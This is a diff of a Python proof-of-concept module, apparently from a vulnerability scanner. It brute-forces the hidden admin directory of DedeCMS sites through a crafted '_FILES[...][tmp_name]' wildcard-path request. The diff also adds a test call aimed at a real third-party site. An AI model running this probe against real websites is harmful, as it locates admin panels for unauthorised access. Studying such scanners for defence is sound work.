@@ -3,7 +3,8 @@
 # @author: 'orleven'
 
 """
-    https://xz.aliyun.com/t/2064 find manage
+find manage for dedecms
+https://xz.aliyun.com/t/2064
 """
 
 import itertools
@@ -21,7 +22,7 @@ def prove(data):
     '''
     比较耗时，建议单独跑脚本
     '''
-    data = init(data, 'web')
+    data = init(data, 'dedecms')
     if data['base_url']:
         characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
         _data = {
@@ -73,8 +74,12 @@ def prove(data):
                                 _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
 
                 if x < 29 and flag ==1:
-
                     data['flag'] = 1
-                    data['data'].append({"url": back_dir})
-                    data['res'].append({"info": back_dir, "key": 'dede_manage'})
+                    data['data'].append({"url": data['base_url'] + a + back_dir})
+                    data['res'].append({"info":  data['base_url'] + a + back_dir, "key": 'dede_manage'})
     return data
+
+
+if __name__=='__main__':
+    from script import init, curl
+    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))
